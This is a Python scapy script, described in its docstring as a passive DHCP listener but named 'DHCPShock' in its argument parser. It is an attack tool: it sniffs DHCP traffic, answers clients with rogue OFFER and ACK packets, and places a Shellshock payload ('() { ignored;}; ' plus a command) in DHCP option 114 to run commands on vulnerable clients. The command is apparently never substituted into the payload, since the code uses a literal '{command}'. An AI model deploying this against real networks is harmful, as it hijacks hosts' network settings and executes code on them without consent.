#!/usr/bin/env python3
"""scapy-dhcp-listener.py
Listen for DHCP packets using scapy to learn when LAN 
hosts request IP addresses from DHCP Servers.
Copyright (C) 2019 Shamiul Hasan
License MIT
"""

from __future__ import print_function

import argparse
import binascii

from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

__version__ = "0.0.3"

parser = argparse.ArgumentParser(description='DHCPShock', epilog='Shock dem shells!')
parser.add_argument('-i', '--iface', type=str, required=True, help='Interface to use')
parser.add_argument('-c', '--cmd', type=str, help='Command to execute [default: "echo pwned"]')

args = parser.parse_args()

command = args.cmd or "echo 'pwned'"


# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):
    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


def make_dhcp_offer_packet(raw_mac, xid):
    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
              IP(src="192.168.2.1", dst='255.255.255.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
              DHCP(options=[("message-type", "offer"),
                            ('server_id', '192.168.2.1'),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', '192.168.2.5'),
                            ('lease_time', 172800),
                            ('renewal_time', 86400),
                            ('rebinding_time', 138240),
                            "end"]))

    return packet


def make_dhcp_ack_packet(raw_mac, xid, command):
    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
              IP(src="192.168.2.1", dst='255.255.255.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
              DHCP(options=[("message-type", "ack"),
                            ('server_id', '192.168.2.1'),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', '192.168.2.5'),
                            ('lease_time', 172800),
                            ('renewal_time', 86400),
                            ('rebinding_time', 138240),
                            (114, b"() { ignored;}; " + b"{command}"),
                            "end"]))

    return packet


def send_rogue_dhcp_offer_packet(packet):
    mac_addr = packet[Ether].src
    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

    xid = packet[BOOTP].xid
    print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))

    print('XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX')

    new_packet = make_dhcp_offer_packet(raw_mac, xid)
    print('New Packet data is:')
    print(new_packet.show())
    print("\n[*] Sending Rogue OFFER...")
    sendp(new_packet, iface=args.iface)

    print('XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX')
    return


def send_rogue_dhcp_ACK_packet(packet):
    mac_addr = packet[Ether].src
    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

    xid = packet[BOOTP].xid
    print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))

    print('XXXXXXXXXXXXXX Rogue ACK packet on BUILD XXXXXXXXXXXXXX')

    new_packet = make_dhcp_ack_packet(raw_mac, xid, command)

    print('New Packet data is:')
    print(new_packet.show())
    print("\n[*] Sending ACK...")
    sendp(new_packet, iface=args.iface)
    print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')

    return


def handle_dhcp_packet(packet):
    # print hexdump(packet)

    # Match DHCP discover
    if DHCP in packet and packet[DHCP].options[0][1] == 1:
        print('---')
        print('New GOOD DHCP Discover')
        hostname = get_option(packet[DHCP].options, 'hostname')
        print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")

        # Sending rogue offer packet
        send_rogue_dhcp_offer_packet(packet)

    # Match DHCP offer
    elif DHCP in packet and packet[DHCP].options[0][1] == 2:
        print('---')
        print('New GOOD DHCP Offer')
        # print(packet.summary())
        # print(ls(packet))

        subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
        lease_time = get_option(packet[DHCP].options, 'lease_time')
        router = get_option(packet[DHCP].options, 'router')
        name_server = get_option(packet[DHCP].options, 'name_server')
        domain = get_option(packet[DHCP].options, 'domain')

        print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
              f"offered {packet[BOOTP].yiaddr}")

        print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
              f"{lease_time}, router: {router}, name_server: {name_server}, "
              f"domain: {domain}")

    # Match DHCP request
    elif DHCP in packet and packet[DHCP].options[0][1] == 3:
        print('---')
        print('New GOOD DHCP Request')
        # print(packet.summary())
        # print(ls(packet))

        requested_addr = get_option(packet[DHCP].options, 'requested_addr')
        hostname = get_option(packet[DHCP].options, 'hostname')
        print(f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")

        # sending rogue ack packet
        send_rogue_dhcp_ACK_packet(packet)

    # Match DHCP ack
    elif DHCP in packet and packet[DHCP].options[0][1] == 5:
        print('---')
        print('New GOOD DHCP Ack')
        # print(packet.summary())
        # print(ls(packet))

        subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
        lease_time = get_option(packet[DHCP].options, 'lease_time')
        router = get_option(packet[DHCP].options, 'router')
        name_server = get_option(packet[DHCP].options, 'name_server')

        print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
              f"acked {packet[BOOTP].yiaddr}")

        print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
              f"{lease_time}, router: {router}, name_server: {name_server}")

    # Match DHCP inform
    elif DHCP in packet and packet[DHCP].options[0][1] == 8:
        print('---')
        print('New GOOD DHCP Inform')
        # print(packet.summary())
        # print(ls(packet))

        hostname = get_option(packet[DHCP].options, 'hostname')
        vendor_class_id = get_option(packet[DHCP].options, 'vendor_class_id')

        print(f"DHCP Inform from {packet[IP].src} ({packet[Ether].src}) "
              f"hostname: {hostname}, vendor_class_id: {vendor_class_id}")

    else:
        print('---')
        print('Some Other DHCP Packet')
        # print(packet.summary())
        # print(ls(packet))

    print('Packet data is:')
    print(packet.show())

    return


if __name__ == "__main__":
    sniff(iface=args.iface, filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
